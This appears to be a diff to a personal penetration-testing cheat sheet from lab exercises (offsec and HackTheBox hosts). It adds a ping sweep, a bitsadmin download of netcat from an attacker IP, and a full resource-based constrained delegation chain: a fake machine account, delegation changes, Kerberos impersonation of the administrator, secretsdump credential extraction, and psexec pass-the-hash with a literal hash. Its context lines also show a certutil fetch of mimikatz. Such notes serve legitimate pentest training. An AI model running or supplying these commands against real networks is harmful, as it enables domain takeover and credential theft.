@@ -8,6 +8,9 @@
 ### grep for a string in a dir of files
 `grep -ls 'pass' ${PWD}/* `
 
+### Bash ping sweep
+`for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done` 
+
 ### powershell recursive grep like search
 `ls -R -Hidden -EA SilentlyContinue | select-string <search string>`
 ​
@@ -38,11 +41,44 @@
 ### Certutil transfer **HIGHLY EFFECTIVE**
 `certutil.exe -urlcache -split -f http://192.168.119.143:8000/mimikatz.exe`
 
+### If certutil fails try bitsadmin
+`bitsadmin /transfer job /download /priority high http://192.168.245.139/nc.exe c:\\pwn\\nc.exe'`
+
 ### ldapsearch to get object in a directory 
 `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.169.122" "(objectclass=*)"` 
 
 ### Dump AD Users properties (w/ shell)
 `get-aduser -filter * -properties *` 
+
+### Import ps1 module
+`import-module $PATH\powerview.ps1` 
+
+### Use Powermad.ps1 to add new machine account 
+`New-MachineAccount -MachineAccount MYFAKECOMPUTER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose` 
+
+### Set PrincipalsAllowedToDelegateToAccount property on a host
+`Set-ADComputer $host -PrincipalsAllowedToDelegateToAccount MYFAKECOMPUTER$`
+
+### Confirm the PrincipalsAllowedToDelegateToAccount property is changed  
+`Get-ADComputer $host -Properties PrincipalsAllowedToDelegateToAccount`
+
+### Search for computers with PrincipalsAllowedToDelegateToAccount set 
+`Get-DomainComputer | Where-Object {$_."msDs-AllowedToActOnBehalfofOtherIdentity" -ne $null}` 
+
+### Get kerberos ticket via computer with ability to impersonate via PrincipalsAllowedToDelegateToAccount
+`getST.py -spn cifs/dc.support.htb -impersonate administrator support/MYFAKECOMPUTER$` 
+
+### export kerberos ticket in Kali
+`export KRB5CCNAME=~/administrator.ccache` 
+
+### use rbcd.py to create delegation to DC$ 
+`rbcd.py -delegate-to DC$ -dc-ip 10.10.11.174 -action read support/MYFAKECOMPUTER$:123456` 
+
+### secretsdump.py with kerberos 
+`secretsdump.py -k -no-pass dc.support.htb` 
+
+### psexec.py with hash example 
+`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26 Administrator@10.10.11.174` 
 
 ### use ps remoting to invoke commands powershell 
 
